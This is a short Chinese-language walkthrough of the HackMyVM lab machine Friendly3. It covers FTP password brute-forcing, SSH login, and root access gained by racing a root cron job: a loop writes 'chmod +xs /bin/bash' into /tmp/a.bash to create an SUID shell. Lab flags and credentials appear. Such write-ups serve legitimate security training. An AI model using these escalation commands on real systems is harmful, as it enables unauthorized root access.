# Friendly3

2025.03.14 https://hackmyvm.eu/machines/machine.php?vm=Friendly3

[video](https://www.bilibili.com/video/BV1fYQzY5EeU/?spm_id_from=333.1387.upload.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.39

## Scan

```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

ftp 不可匿名登陆，访问 80 web 首页，发现 juan 向 ftp 上传了文件，web 目录扫描什么都没有。

根据 juan 爆破一下 ftp，得到登陆密码 alexis ，枚举后，文件夹 fold5 fold8 和 文件 fole32 file80 有内容，全部下载，但是毛都没有。

尝试使用得到的凭据，登陆 ssh 成功，先拿到 user flag：

```
juan@friendly3:~$ cat user.txt
cb40b159c8086733d57280de3f97de30
```

枚举发现 /opt/check_for_install.sh 看其内容可能是定时执行的，上传 pspy 进行探测，发现这个脚本每分钟执行一次：

```
/usr/bin/curl "http://127.0.0.1/9842734723948024.bash" > /tmp/a.bash
chmod +x /tmp/a.bash
chmod +r /tmp/a.bash
chmod +w /tmp/a.bash
/bin/bash /tmp/a.bash
rm -rf /tmp/a.bash
```

会从本地 127.0.0.1 下载脚本 9842734723948024.bash 这里没有修改这个脚本的权限，但是可以利用条件竞争事先建立好一个 /tmp/a.bash 脚本循环写入提权命令，在 59 秒时执行：

```
for i in {1..10000}; do echo 'chmod +xs /bin/bash' >> /tmp/a.bash ; done
```

最终 bash 变成 suid 程序，拿到最终 root flag:

```
bash-5.2# cat root.txt
eb9748b67f25e6bd202e5fa25f534d51
```
